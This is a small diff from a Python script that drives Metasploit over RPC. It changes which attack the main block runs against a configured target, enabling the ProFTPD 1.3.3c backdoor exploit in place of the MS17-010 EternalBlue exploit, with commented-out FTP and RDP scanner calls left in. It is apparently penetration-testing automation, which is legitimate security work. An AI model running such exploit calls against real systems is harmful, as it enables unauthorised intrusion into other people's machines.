@@ -144,12 +144,12 @@ if __name__ == '__main__':
     # client = MsfRpcClient(data.get('metasploit_password'), port=data.get('metasploit_port'), server=data.get('metasploit_ip'))
     # print([m for m in dir(client) if not m.startswith('_')])
 
-    # metasploit = MetasploitInterface(data.get('metasploit_ip'), data.get('metasploit_port'), data.get('metasploit_password'), data.get('target'), 'exploit/unix/ftp/proftpd_133c_backdoor')
-    # metasploit.exploitFTP()
+    metasploit = MetasploitInterface(data.get('metasploit_ip'), data.get('metasploit_port'), data.get('metasploit_password'), data.get('target'), 'exploit/unix/ftp/proftpd_133c_backdoor')
+    metasploit.exploitFTP()
     # metasploit = MetasploitInterface(data.get('metasploit_ip'), data.get('metasploit_port'), data.get('metasploit_password'), data.get('target'), 'auxiliary/scanner/ftp/anonymous')
     # metasploit.scanFTP()
-    metasploit = MetasploitInterface(data.get('metasploit_ip'), data.get('metasploit_port'), data.get('metasploit_password'), data.get('target'), 'exploit/windows/smb/ms17_010_eternalblue')
-    metasploit.eternalBlue()
+    # metasploit = MetasploitInterface(data.get('metasploit_ip'), data.get('metasploit_port'), data.get('metasploit_password'), data.get('target'), 'exploit/windows/smb/ms17_010_eternalblue')
+    # metasploit.eternalBlue()
 
     # metasploit = MetasploitInterface(data.get('metasploit_ip'), data.get('metasploit_port'), data.get('metasploit_password'), data.get('target'), 'auxiliary/scanner/rdp/rdp_scanner')
     # metasploit.rdpScanner()
